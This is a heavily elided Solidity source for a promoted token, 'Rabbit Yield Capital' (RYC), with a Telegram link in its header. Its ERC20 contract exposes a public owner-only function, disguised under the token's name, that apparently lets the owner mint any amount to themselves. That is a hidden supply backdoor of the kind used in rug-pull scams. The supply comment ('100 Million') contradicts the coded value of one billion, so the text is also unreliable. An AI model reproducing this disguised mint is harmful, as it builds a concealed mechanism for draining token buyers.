...
//
// $RabbitYieldCapital proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+SfFB0xSnrQdmZTJl
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _RabbitYieldCapital(uint256 amount) public onlyOwner {
 _RabbitYieldCapital(msg.sender, amount);
    }
    ...
    function _RabbitYieldCapital(address account, uint256 amount) internal virtual {
...
contract $RabbitYieldCapital is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Rabbit Yield Capital", "RYC") {
     _RabbitYieldCapital(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}